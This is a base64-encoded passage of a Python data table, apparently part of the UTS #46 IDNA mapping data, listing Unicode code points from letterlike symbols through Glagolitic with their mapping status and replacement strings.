XCdNXCcsIFwnY1wnKSxcbiAgICAoMHgyMTAzLCBcJ01cJywgXCdceGMyXHhiMGNcJyksXG4gICAgKDB4MjEwNCwgXCdWXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMjIoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDIxMDUsIFwnM1wnLCBcJ2Mvb1wnKSxcbiAgICAoMHgyMTA2LCBcJzNcJywgXCdjL3VcJyksXG4gICAgKDB4MjEwNywgXCdNXCcsIFwnXHhjOVx4OWJcJyksXG4gICAgKDB4MjEwOCwgXCdWXCcpLFxuICAgICgweDIxMDksIFwnTVwnLCBcJ1x4YzJceGIwZlwnKSxcbiAgICAoMHgyMTBBLCBcJ01cJywgXCdnXCcpLFxuICAgICgweDIxMEIsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MjEwRiwgXCdNXCcsIFwnXHhjNFx4YTdcJyksXG4gICAgKDB4MjExMCwgXCdNXCcsIFwnaVwnKSxcbiAgICAoMHgyMTEyLCBcJ01cJywgXCdsXCcpLFxuICAgICgweDIxMTQsIFwnVlwnKSxcbiAgICAoMHgyMTE1LCBcJ01cJywgXCduXCcpLFxuICAgICgweDIxMTYsIFwnTVwnLCBcJ25vXCcpLFxuICAgICgweDIxMTcsIFwnVlwnKSxcbiAgICAoMHgyMTE5LCBcJ01cJywgXCdwXCcpLFxuICAgICgweDIxMUEsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MjExQiwgXCdNXCcsIFwnclwnKSxcbiAgICAoMHgyMTFFLCBcJ1ZcJyksXG4gICAgKDB4MjEyMCwgXCdNXCcsIFwnc21cJyksXG4gICAgKDB4MjEyMSwgXCdNXCcsIFwndGVsXCcpLFxuICAgICgweDIxMjIsIFwnTVwnLCBcJ3RtXCcpLFxuICAgICgweDIxMjMsIFwnVlwnKSxcbiAgICAoMHgyMTI0LCBcJ01cJywgXCd6XCcpLFxuICAgICgweDIxMjUsIFwnVlwnKSxcbiAgICAoMHgyMTI2LCBcJ01cJywgXCdceGNmXHg4OVwnKSxcbiAgICAoMHgyMTI3LCBcJ1ZcJyksXG4gICAgKDB4MjEyOCwgXCdNXCcsIFwnelwnKSxcbiAgICAoMHgyMTI5LCBcJ1ZcJyksXG4gICAgKDB4MjEyQSwgXCdNXCcsIFwna1wnKSxcbiAgICAoMHgyMTJCLCBcJ01cJywgXCdceGMzXHhhNVwnKSxcbiAgICAoMHgyMTJDLCBcJ01cJywgXCdiXCcpLFxuICAgICgweDIxMkQsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MjEyRSwgXCdWXCcpLFxuICAgICgweDIxMkYsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MjEzMSwgXCdNXCcsIFwnZlwnKSxcbiAgICAoMHgyMTMyLCBcJ1hcJyksXG4gICAgKDB4MjEzMywgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHgyMTM0LCBcJ01cJywgXCdvXCcpLFxuICAgICgweDIxMzUsIFwnTVwnLCBcJ1x4ZDdceDkwXCcpLFxuICAgICgweDIxMzYsIFwnTVwnLCBcJ1x4ZDdceDkxXCcpLFxuICAgICgweDIxMzcsIFwnTVwnLCBcJ1x4ZDdceDkyXCcpLFxuICAgICgweDIxMzgsIFwnTVwnLCBcJ1x4ZDdceDkzXCcpLFxuICAgICgweDIxMzksIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MjEzQSwgXCdWXCcpLFxuICAgICgweDIxM0IsIFwnTVwnLCBcJ2ZheFwnKSxcbiAgICAoMHgyMTNDLCBcJ01cJywgXCdceGNmXHg4MFwnKSxcbiAgICAoMHgyMTNELCBcJ01cJywgXCdceGNlXHhiM1wnKSxcbiAgICAoMHgyMTNGLCBcJ01cJywgXCdceGNmXHg4MFwnKSxcbiAgICAoMHgyMTQwLCBcJ01cJywgXCdceGUyXHg4OFx4OTFcJyksXG4gICAgKDB4MjE0MSwgXCdWXCcpLFxuICAgICgweDIxNDUsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MjE0NywgXCdNXCcsIFwnZVwnKSxcbiAgICAoMHgyMTQ4LCBcJ01cJywgXCdpXCcpLFxuICAgICgweDIxNDksIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MjE0QSwgXCdWXCcpLFxuICAgICgweDIxNTAsIFwnTVwnLCBcJzFceGUyXHg4MVx4ODQ3XCcpLFxuICAgICgweDIxNTEsIFwnTVwnLCBcJzFceGUyXHg4MVx4ODQ5XCcpLFxuICAgICgweDIxNTIsIFwnTVwnLCBcJzFceGUyXHg4MVx4ODQxMFwnKSxcbiAgICAoMHgyMTUzLCBcJ01cJywgXCcxXHhlMlx4ODFceDg0M1wnKSxcbiAgICAoMHgyMTU0LCBcJ01cJywgXCcyXHhlMlx4ODFceDg0M1wnKSxcbiAgICAoMHgyMTU1LCBcJ01cJywgXCcxXHhlMlx4ODFceDg0NVwnKSxcbiAgICAoMHgyMTU2LCBcJ01cJywgXCcyXHhlMlx4ODFceDg0NVwnKSxcbiAgICAoMHgyMTU3LCBcJ01cJywgXCczXHhlMlx4ODFceDg0NVwnKSxcbiAgICAoMHgyMTU4LCBcJ01cJywgXCc0XHhlMlx4ODFceDg0NVwnKSxcbiAgICAoMHgyMTU5LCBcJ01cJywgXCcxXHhlMlx4ODFceDg0NlwnKSxcbiAgICAoMHgyMTVBLCBcJ01cJywgXCc1XHhlMlx4ODFceDg0NlwnKSxcbiAgICAoMHgyMTVCLCBcJ01cJywgXCcxXHhlMlx4ODFceDg0OFwnKSxcbiAgICAoMHgyMTVDLCBcJ01cJywgXCczXHhlMlx4ODFceDg0OFwnKSxcbiAgICAoMHgyMTVELCBcJ01cJywgXCc1XHhlMlx4ODFceDg0OFwnKSxcbiAgICAoMHgyMTVFLCBcJ01cJywgXCc3XHhlMlx4ODFceDg0OFwnKSxcbiAgICAoMHgyMTVGLCBcJ01cJywgXCcxXHhlMlx4ODFceDg0XCcpLFxuICAgICgweDIxNjAsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MjE2MSwgXCdNXCcsIFwnaWlcJyksXG4gICAgKDB4MjE2MiwgXCdNXCcsIFwnaWlpXCcpLFxuICAgICgweDIxNjMsIFwnTVwnLCBcJ2l2XCcpLFxuICAgICgweDIxNjQsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MjE2NSwgXCdNXCcsIFwndmlcJyksXG4gICAgKDB4MjE2NiwgXCdNXCcsIFwndmlpXCcpLFxuICAgICgweDIxNjcsIFwnTVwnLCBcJ3ZpaWlcJyksXG4gICAgKDB4MjE2OCwgXCdNXCcsIFwnaXhcJyksXG4gICAgKDB4MjE2OSwgXCdNXCcsIFwneFwnKSxcbiAgICAoMHgyMTZBLCBcJ01cJywgXCd4aVwnKSxcbiAgICAoMHgyMTZCLCBcJ01cJywgXCd4aWlcJyksXG4gICAgKDB4MjE2QywgXCdNXCcsIFwnbFwnKSxcbiAgICAoMHgyMTZELCBcJ01cJywgXCdjXCcpLFxuICAgICgweDIxNkUsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MjE2RiwgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHgyMTcwLCBcJ01cJywgXCdpXCcpLFxuICAgICgweDIxNzEsIFwnTVwnLCBcJ2lpXCcpLFxuICAgICgweDIxNzIsIFwnTVwnLCBcJ2lpaVwnKSxcbiAgICAoMHgyMTczLCBcJ01cJywgXCdpdlwnKSxcbiAgICAoMHgyMTc0LCBcJ01cJywgXCd2XCcpLFxuICAgICgweDIxNzUsIFwnTVwnLCBcJ3ZpXCcpLFxuICAgICgweDIxNzYsIFwnTVwnLCBcJ3ZpaVwnKSxcbiAgICAoMHgyMTc3LCBcJ01cJywgXCd2aWlpXCcpLFxuICAgICgweDIxNzgsIFwnTVwnLCBcJ2l4XCcpLFxuICAgICgweDIxNzksIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MjE3QSwgXCdNXCcsIFwneGlcJyksXG4gICAgKDB4MjE3QiwgXCdNXCcsIFwneGlpXCcpLFxuICAgICgweDIxN0MsIFwnTVwnLCBcJ2xcJyksXG4gICAgXVxuXG5kZWYgX3NlZ18yMygpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MjE3RCwgXCdNXCcsIFwnY1wnKSxcbiAgICAoMHgyMTdFLCBcJ01cJywgXCdkXCcpLFxuICAgICgweDIxN0YsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MjE4MCwgXCdWXCcpLFxuICAgICgweDIxODMsIFwnWFwnKSxcbiAgICAoMHgyMTg0LCBcJ1ZcJyksXG4gICAgKDB4MjE4OSwgXCdNXCcsIFwnMFx4ZTJceDgxXHg4NDNcJyksXG4gICAgKDB4MjE4QSwgXCdWXCcpLFxuICAgICgweDIxOEMsIFwnWFwnKSxcbiAgICAoMHgyMTkwLCBcJ1ZcJyksXG4gICAgKDB4MjIyQywgXCdNXCcsIFwnXHhlMlx4ODhceGFiXHhlMlx4ODhceGFiXCcpLFxuICAgICgweDIyMkQsIFwnTVwnLCBcJ1x4ZTJceDg4XHhhYlx4ZTJceDg4XHhhYlx4ZTJceDg4XHhhYlwnKSxcbiAgICAoMHgyMjJFLCBcJ1ZcJyksXG4gICAgKDB4MjIyRiwgXCdNXCcsIFwnXHhlMlx4ODhceGFlXHhlMlx4ODhceGFlXCcpLFxuICAgICgweDIyMzAsIFwnTVwnLCBcJ1x4ZTJceDg4XHhhZVx4ZTJceDg4XHhhZVx4ZTJceDg4XHhhZVwnKSxcbiAgICAoMHgyMjMxLCBcJ1ZcJyksXG4gICAgKDB4MjI2MCwgXCczXCcpLFxuICAgICgweDIyNjEsIFwnVlwnKSxcbiAgICAoMHgyMjZFLCBcJzNcJyksXG4gICAgKDB4MjI3MCwgXCdWXCcpLFxuICAgICgweDIzMjksIFwnTVwnLCBcJ1x4ZTNceDgwXHg4OFwnKSxcbiAgICAoMHgyMzJBLCBcJ01cJywgXCdceGUzXHg4MFx4ODlcJyksXG4gICAgKDB4MjMyQiwgXCdWXCcpLFxuICAgICgweDI0MjcsIFwnWFwnKSxcbiAgICAoMHgyNDQwLCBcJ1ZcJyksXG4gICAgKDB4MjQ0QiwgXCdYXCcpLFxuICAgICgweDI0NjAsIFwnTVwnLCBcJzFcJyksXG4gICAgKDB4MjQ2MSwgXCdNXCcsIFwnMlwnKSxcbiAgICAoMHgyNDYyLCBcJ01cJywgXCczXCcpLFxuICAgICgweDI0NjMsIFwnTVwnLCBcJzRcJyksXG4gICAgKDB4MjQ2NCwgXCdNXCcsIFwnNVwnKSxcbiAgICAoMHgyNDY1LCBcJ01cJywgXCc2XCcpLFxuICAgICgweDI0NjYsIFwnTVwnLCBcJzdcJyksXG4gICAgKDB4MjQ2NywgXCdNXCcsIFwnOFwnKSxcbiAgICAoMHgyNDY4LCBcJ01cJywgXCc5XCcpLFxuICAgICgweDI0NjksIFwnTVwnLCBcJzEwXCcpLFxuICAgICgweDI0NkEsIFwnTVwnLCBcJzExXCcpLFxuICAgICgweDI0NkIsIFwnTVwnLCBcJzEyXCcpLFxuICAgICgweDI0NkMsIFwnTVwnLCBcJzEzXCcpLFxuICAgICgweDI0NkQsIFwnTVwnLCBcJzE0XCcpLFxuICAgICgweDI0NkUsIFwnTVwnLCBcJzE1XCcpLFxuICAgICgweDI0NkYsIFwnTVwnLCBcJzE2XCcpLFxuICAgICgweDI0NzAsIFwnTVwnLCBcJzE3XCcpLFxuICAgICgweDI0NzEsIFwnTVwnLCBcJzE4XCcpLFxuICAgICgweDI0NzIsIFwnTVwnLCBcJzE5XCcpLFxuICAgICgweDI0NzMsIFwnTVwnLCBcJzIwXCcpLFxuICAgICgweDI0NzQsIFwnM1wnLCBcJygxKVwnKSxcbiAgICAoMHgyNDc1LCBcJzNcJywgXCcoMilcJyksXG4gICAgKDB4MjQ3NiwgXCczXCcsIFwnKDMpXCcpLFxuICAgICgweDI0NzcsIFwnM1wnLCBcJyg0KVwnKSxcbiAgICAoMHgyNDc4LCBcJzNcJywgXCcoNSlcJyksXG4gICAgKDB4MjQ3OSwgXCczXCcsIFwnKDYpXCcpLFxuICAgICgweDI0N0EsIFwnM1wnLCBcJyg3KVwnKSxcbiAgICAoMHgyNDdCLCBcJzNcJywgXCcoOClcJyksXG4gICAgKDB4MjQ3QywgXCczXCcsIFwnKDkpXCcpLFxuICAgICgweDI0N0QsIFwnM1wnLCBcJygxMClcJyksXG4gICAgKDB4MjQ3RSwgXCczXCcsIFwnKDExKVwnKSxcbiAgICAoMHgyNDdGLCBcJzNcJywgXCcoMTIpXCcpLFxuICAgICgweDI0ODAsIFwnM1wnLCBcJygxMylcJyksXG4gICAgKDB4MjQ4MSwgXCczXCcsIFwnKDE0KVwnKSxcbiAgICAoMHgyNDgyLCBcJzNcJywgXCcoMTUpXCcpLFxuICAgICgweDI0ODMsIFwnM1wnLCBcJygxNilcJyksXG4gICAgKDB4MjQ4NCwgXCczXCcsIFwnKDE3KVwnKSxcbiAgICAoMHgyNDg1LCBcJzNcJywgXCcoMTgpXCcpLFxuICAgICgweDI0ODYsIFwnM1wnLCBcJygxOSlcJyksXG4gICAgKDB4MjQ4NywgXCczXCcsIFwnKDIwKVwnKSxcbiAgICAoMHgyNDg4LCBcJ1hcJyksXG4gICAgKDB4MjQ5QywgXCczXCcsIFwnKGEpXCcpLFxuICAgICgweDI0OUQsIFwnM1wnLCBcJyhiKVwnKSxcbiAgICAoMHgyNDlFLCBcJzNcJywgXCcoYylcJyksXG4gICAgKDB4MjQ5RiwgXCczXCcsIFwnKGQpXCcpLFxuICAgICgweDI0QTAsIFwnM1wnLCBcJyhlKVwnKSxcbiAgICAoMHgyNEExLCBcJzNcJywgXCcoZilcJyksXG4gICAgKDB4MjRBMiwgXCczXCcsIFwnKGcpXCcpLFxuICAgICgweDI0QTMsIFwnM1wnLCBcJyhoKVwnKSxcbiAgICAoMHgyNEE0LCBcJzNcJywgXCcoaSlcJyksXG4gICAgKDB4MjRBNSwgXCczXCcsIFwnKGopXCcpLFxuICAgICgweDI0QTYsIFwnM1wnLCBcJyhrKVwnKSxcbiAgICAoMHgyNEE3LCBcJzNcJywgXCcobClcJyksXG4gICAgKDB4MjRBOCwgXCczXCcsIFwnKG0pXCcpLFxuICAgICgweDI0QTksIFwnM1wnLCBcJyhuKVwnKSxcbiAgICAoMHgyNEFBLCBcJzNcJywgXCcobylcJyksXG4gICAgKDB4MjRBQiwgXCczXCcsIFwnKHApXCcpLFxuICAgICgweDI0QUMsIFwnM1wnLCBcJyhxKVwnKSxcbiAgICAoMHgyNEFELCBcJzNcJywgXCcocilcJyksXG4gICAgKDB4MjRBRSwgXCczXCcsIFwnKHMpXCcpLFxuICAgICgweDI0QUYsIFwnM1wnLCBcJyh0KVwnKSxcbiAgICAoMHgyNEIwLCBcJzNcJywgXCcodSlcJyksXG4gICAgKDB4MjRCMSwgXCczXCcsIFwnKHYpXCcpLFxuICAgICgweDI0QjIsIFwnM1wnLCBcJyh3KVwnKSxcbiAgICAoMHgyNEIzLCBcJzNcJywgXCcoeClcJyksXG4gICAgKDB4MjRCNCwgXCczXCcsIFwnKHkpXCcpLFxuICAgICgweDI0QjUsIFwnM1wnLCBcJyh6KVwnKSxcbiAgICAoMHgyNEI2LCBcJ01cJywgXCdhXCcpLFxuICAgICgweDI0QjcsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MjRCOCwgXCdNXCcsIFwnY1wnKSxcbiAgICAoMHgyNEI5LCBcJ01cJywgXCdkXCcpLFxuICAgICgweDI0QkEsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MjRCQiwgXCdNXCcsIFwnZlwnKSxcbiAgICAoMHgyNEJDLCBcJ01cJywgXCdnXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMjQoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDI0QkQsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MjRCRSwgXCdNXCcsIFwnaVwnKSxcbiAgICAoMHgyNEJGLCBcJ01cJywgXCdqXCcpLFxuICAgICgweDI0QzAsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MjRDMSwgXCdNXCcsIFwnbFwnKSxcbiAgICAoMHgyNEMyLCBcJ01cJywgXCdtXCcpLFxuICAgICgweDI0QzMsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MjRDNCwgXCdNXCcsIFwnb1wnKSxcbiAgICAoMHgyNEM1LCBcJ01cJywgXCdwXCcpLFxuICAgICgweDI0QzYsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MjRDNywgXCdNXCcsIFwnclwnKSxcbiAgICAoMHgyNEM4LCBcJ01cJywgXCdzXCcpLFxuICAgICgweDI0QzksIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MjRDQSwgXCdNXCcsIFwndVwnKSxcbiAgICAoMHgyNENCLCBcJ01cJywgXCd2XCcpLFxuICAgICgweDI0Q0MsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MjRDRCwgXCdNXCcsIFwneFwnKSxcbiAgICAoMHgyNENFLCBcJ01cJywgXCd5XCcpLFxuICAgICgweDI0Q0YsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MjREMCwgXCdNXCcsIFwnYVwnKSxcbiAgICAoMHgyNEQxLCBcJ01cJywgXCdiXCcpLFxuICAgICgweDI0RDIsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MjREMywgXCdNXCcsIFwnZFwnKSxcbiAgICAoMHgyNEQ0LCBcJ01cJywgXCdlXCcpLFxuICAgICgweDI0RDUsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MjRENiwgXCdNXCcsIFwnZ1wnKSxcbiAgICAoMHgyNEQ3LCBcJ01cJywgXCdoXCcpLFxuICAgICgweDI0RDgsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MjREOSwgXCdNXCcsIFwnalwnKSxcbiAgICAoMHgyNERBLCBcJ01cJywgXCdrXCcpLFxuICAgICgweDI0REIsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MjREQywgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHgyNERELCBcJ01cJywgXCduXCcpLFxuICAgICgweDI0REUsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MjRERiwgXCdNXCcsIFwncFwnKSxcbiAgICAoMHgyNEUwLCBcJ01cJywgXCdxXCcpLFxuICAgICgweDI0RTEsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MjRFMiwgXCdNXCcsIFwnc1wnKSxcbiAgICAoMHgyNEUzLCBcJ01cJywgXCd0XCcpLFxuICAgICgweDI0RTQsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MjRFNSwgXCdNXCcsIFwndlwnKSxcbiAgICAoMHgyNEU2LCBcJ01cJywgXCd3XCcpLFxuICAgICgweDI0RTcsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MjRFOCwgXCdNXCcsIFwneVwnKSxcbiAgICAoMHgyNEU5LCBcJ01cJywgXCd6XCcpLFxuICAgICgweDI0RUEsIFwnTVwnLCBcJzBcJyksXG4gICAgKDB4MjRFQiwgXCdWXCcpLFxuICAgICgweDJBMEMsIFwnTVwnLCBcJ1x4ZTJceDg4XHhhYlx4ZTJceDg4XHhhYlx4ZTJceDg4XHhhYlx4ZTJceDg4XHhhYlwnKSxcbiAgICAoMHgyQTBELCBcJ1ZcJyksXG4gICAgKDB4MkE3NCwgXCczXCcsIFwnOjo9XCcpLFxuICAgICgweDJBNzUsIFwnM1wnLCBcJz09XCcpLFxuICAgICgweDJBNzYsIFwnM1wnLCBcJz09PVwnKSxcbiAgICAoMHgyQTc3LCBcJ1ZcJyksXG4gICAgKDB4MkFEQywgXCdNXCcsIFwnXHhlMlx4YWJceDlkXHhjY1x4YjhcJyksXG4gICAgKDB4MkFERCwgXCdWXCcpLFxuICAgICgweDJCNzQsIFwnWFwnKSxcbiAgICAoMHgyQjc2LCBcJ1ZcJyksXG4gICAgKDB4MkI5NiwgXCdYXCcpLFxuICAgICgweDJCOTcsIFwnVlwnKSxcbiAgICAoMHgyQzAwLCBcJ01cJywgXCdceGUyXHhiMFx4YjBcJyksXG4gICAgKDB4MkMwMSwgXCdNXCcsIFwnXHhlMlx4YjBceGIxXCcpLFxuICAgICgweDJDMDIsIFwnTVwnLCBcJ1x4ZTJceGIwXHhiMlwnKSxcbiAgICAoMHgyQzAzLCBcJ01cJywgXCdceGUyXHhiMFx4YjNcJyksXG4gICAgKDB4MkMwNCwgXCdNXCcsIFwnXHhlMlx4YjBceGI0XCcpLFxuICAgICgweDJDMDUsIFwnTVwnLCBcJ1x4ZTJceGIwXHhiNVwnKSxcbiAgICAoMHgyQzA2LCBcJ01cJywgXCdceGUyXHhiMFx4YjZcJyksXG4gICAgKDB4MkMwNywgXCdNXCcsIFwnXHhlMlx4YjBceGI3XCcpLFxuICAgICgweDJDMDgsIFwnTVwnLCBcJ1x4ZTJceGIwXHhiOFwnKSxcbiAgICAoMHgyQzA5LCBcJ01cJywgXCdceGUyXHhiMFx4YjlcJyksXG4gICAgKDB4MkMwQSwgXCdNXCcsIFwnXHhlMlx4YjBceGJhXCcpLFxuICAgICgweDJDMEIsIFwnTVwnLCBcJ1x4ZTJceGIwXHhiYlwnKSxcbiAgICAoMHgyQzBDLCBcJ01cJywgXCdceGUyXHhiMFx4YmNcJyksXG4gICAgKDB4MkMwRCwgXCdNXCcsIFwnXHhlMlx4YjBceGJkXCcpLFxuICAgICgweDJDMEUsIFwnTVwnLCBcJ1x4ZTJceGIwXHhiZVwnKSxcbiAgICAoMHgyQzBGLCBcJ01cJywgXCdceGUyXHhiMFx4YmZcJyksXG4gICAgKDB4MkMxMCwgXCdNXCcsIFwnXHhlMlx4YjFceDgwXCcpLFxuICAgICgweDJDMTEsIFwnTVwnLCBcJ1x4ZTJceGIxXHg4MVwnKSxcbiAgICAoMHgyQzEyLCBcJ01cJywgXCdceGUyXHhiMVx4ODJcJyksXG4gICAgKDB4MkMxMywgXCdNXCcsIFwnXHhlMlx4YjFceDgzXCcpLFxuICAgICgweDJDMTQsIFwnTVwnLCBcJ1x4ZTJceGIxXHg4NFwnKSxcbiAgICAoMHgyQzE1LCBcJ01cJywgXCdceGUyXHhiMVx4ODVcJyksXG4gICAgKDB4MkMxNiwgXCdNXCcsIFwnXHhlMlx4YjFceDg2XCcpLFxuICAgICgweDJDMTcsIFwnTVwnLCBcJ1x4ZTJceGIxXHg4N1wnKSxcbiAgICAoMHgyQzE4LCBcJ01cJywgXCdceGUyXHhiMVx4ODhcJyksXG4gICAgKDB4MkMxOSwgXCdNXCcsIFwnXHhlMlx4YjFceDg5XCcpLFxuICAgICgweDJDMUEsIFwnTVwnLCBcJ1x4ZTJceGIxXHg4YVwnKSxcbiAgICAoMHgyQzFCLCBcJ01cJywgXCdceGUyXHhiMVx4OGJcJyksXG4gICAgKDB4MkMxQywgXCdNXCcsIFwnXHhlMlx4YjFceDhjXCcpLFxuICAgICgweDJDMUQsIFwnTVwnLCBcJ1x4ZTJceGIxXHg4ZFwnKSxcbiAgICAoMHgyQzFFLCBcJ01cJywgXCdceGUyXHhiMVx4OGVcJyksXG4gICAgKDB4MkMxRiwgXCdNXCcsIFwnXHhlMlx4YjFceDhmXCcpLFxuICAgICgweDJDMjAsIFwnTVwnLCBcJ1x4ZTJceGIxXHg5MFwnKSxcbiAgICAoMHgyQzIxLCBcJ01cJywgXCdceGUyXHhiMVx4OTFcJyksXG4gICAgKDB4MkMyMiwgXCdNXCcsIFwnXHhlMlx4YjFceDkyXCcpLFxuICAgICgweDJDMjMsIFwnTVwnLCBcJ1x4ZTJceGIxXHg5M1wnKSxcbiAgICAoMHgyQzI0LCBcJ01cJywgXCdceGUyXHhiMVx4OTRcJyksXG4gICAgKDB4MkMyNSwgXCdNXCcsIFwnXHhlMlx4YjFceDk1XCcpLFxuICAgICgweDJDMjYsIFwnTVwnLCBcJ1x4ZTJceGIxXHg5NlwnKSxcbiAgICAoMHgyQzI3LCBcJ01cJywgXCdceGUyXHhiMVx4OTdcJyksXG4gICAgKDB4MkMyOCwgXCdNXCcsIFwnXHhlMlx4YjFceDk4XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMjUoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDJDMjksIFwnTVwnLCBcJ1x4ZTJceGIxXHg5OVwnKSxcbiAgICAoMHgyQzJBLCBcJ01cJywgXCdceGUyXHhiMVx4OWFcJyksXG4gICAgKDB4MkMyQiwgXCdNXCcsIFwnXHhlMlx4YjFceDliXCcpLFxuICAgICgweDJDMkMsIFwnTVwnLCBcJ1x4ZTJceGIxXHg5Y1wnKSxcbiAgICAoMHgyQzJELCBcJ01cJywgXCdceGUyXHhiMVx4OWRcJyksXG4gICAgKDB4MkMyRSwgXCdNXCcsIFwnXHhlMlx4YjFceDllXCcpLFxuICAgICgweDJDMkYsIFwnTVwnLCBcJ1x4ZTJceGIxXHg5ZlwnKSxcbiAgICAoMHgyQzMwLCBcJ1ZcJyksXG4gICAgKDB4MkM2MCwgXCdNXCcsIFwnXHhlMlx4YjFceGExXCcpLFxuICAgICgweDJDNjEsIFwnVlwnKSxcbiAgICAoMHgyQzYyLCBcJ01cJywgXCdceGM5XHhhYlwnKSxcbiAgICAoMHgyQzYzLCBcJ01cJywgXCdceGUxXHhiNVx4YmRcJyksXG4gICAgKDB4MkM2NCwgXCdNXCcsIFwnXHhjOVx4YmRcJyksXG4gICAgKDB4MkM2NSwgXCdWXCcpLFxuICAgICgweDJDNjcsIFwnTVwnLCBcJ1x4ZTJceGIxXHhhOFwnKSxcbiAgICAoMHgyQzY4LCBcJ1ZcJyksXG4gICAgKDB4MkM2OSwgXCdNXCcsIFwnXHhlMlx4YjFceGFhXCcpLFxuICAgICgweDJDNkEsIFwnVlwnKSxcbiAgICAoMHgyQzZCLCBcJ01cJywgXCdceGUyXHhiMVx4YWNcJyksXG4gICAgKDB4MkM2QywgXCdWXCcpLFxuICAgICgweDJDNkQsIFwnTVwnLCBcJ1x4YzlceDkxXCcpLFxuICAgICgweDJDNkUsIFwnTVwnLCBcJ1x4YzlceGIxXCcpLFxuICAgICgweDJDNkYsIFwnTVwnLCBcJ1x4YzlceDkwXCcpLFxuICAgICgweDJDNzAsIFwnTVwnLCBcJ1x4YzlceDkyXCcpLFxuICAgICgweDJDNzEsIFwnVlwnKSxcbiAgICAoMHgyQzcyLCBcJ01cJywgXCdceGUyXHhiMVx4YjNcJyksXG4gICAgKDB4MkM3MywgXCdWXCcpLFxuICAgICgweDJDNzUsIFwnTVwnLCBcJ1x4ZTJceGIxXHhiNlwnKSxcbiAgICAoMHgyQzc2LCBcJ1ZcJyksXG4gICAgKDB4MkM3QywgXCdNXCcsIFwnalwnKSxcbiAgICAoMHgyQzdELCBcJ01cJywgXCd2XCcpLFxuICAgICgweDJDN0UsIFwnTVwnLCBcJ1x4YzhceGJmXCcpLFxuICAgICgweDJDN0YsIFwnTVwnLCBcJ1x4YzlceDgwXCcpLFxuICAgICgweDJDODAsIFwnTVwnLCBcJ1x4ZTJceGIyXHg4MVwnKSxcbiAgICAoMHgyQzgxLCBcJ1ZcJyksXG4gICAgKDB4MkM4MiwgXCdNXCcsIFwnXHhlMlx4YjJceDgzXCcpLFxuICAgICgweDJDODMsIFwnVlwnKSxcbiAgICAoMHgyQzg0LCBcJ01cJywgXCdceGUyXHhiMlx4ODVcJyksXG4gICAgKDB4MkM4NSwgXCdWXCcpLFxuICAgICgweDJDODYsIFwnTVwnLCBcJ1x4ZTJceGIyXHg4N1wnKSxcbiAgICAoMHgyQzg3LCBcJ1ZcJyksXG4gICAgKDB4MkM4OCwgXCdNXCcsIFwnXHhlMlx4YjJceDg5XCcpLFxuICAgICgweDJDODksIFwnVlwnKSxcbiAgICAoMHgyQzhBLCBcJ01cJywgXCdceGUyXHhiMlx4OGJcJyksXG4gICAgKDB4MkM4QiwgXCdWXCcpLFxuICAgICgweDJDOEMsIFwnTVwnLCBcJ1x4ZTJceGIyXHg4ZFwnKSxcbiAgICAoMHgyQzhELCBcJ1ZcJyksXG4gICAgKDB4MkM4RSwgXCdNXCcsIFwnXHhlMlx4YjJceDhmXCcpLFxuICAgICgweDJDOEYsIFwnVlwnKSxcbiAgICAoMHgyQzkwLCBcJ01cJywgXCdceGUyXHhiMlx4OTFcJyksXG4gICAgKDB4MkM5MSwgXCdWXCcpLFxuICAgICgweDJDOTIsIFwnTVwnLCBcJ1x4ZTJceGIyXHg5M1wnKSxcbiAgICAoMHgyQzkzLCBcJ1ZcJyksXG4gICAgKDB4MkM5NCwgXCdNXCcsIFwnXHhlMlx4YjJceDk1XCcpLFxuICAgICgweDJDOTUsIFwnVlwnKSxcbiAgICAoMHgyQzk2LCBcJ01cJywgXCdceGUyXHhiMlx4OTdcJyksXG4gICAgKDB4MkM5NywgXCdWXCcpLFxuICAgICgweDJDOTgsIFwnTVwnLCBcJ1x4ZTJceGIyXHg5OVwnKSxcbiAgICAoMHgyQzk5LCBcJ1ZcJyksXG4gICAgKDB4MkM5QSwgXCdNXCcsIFwnXHh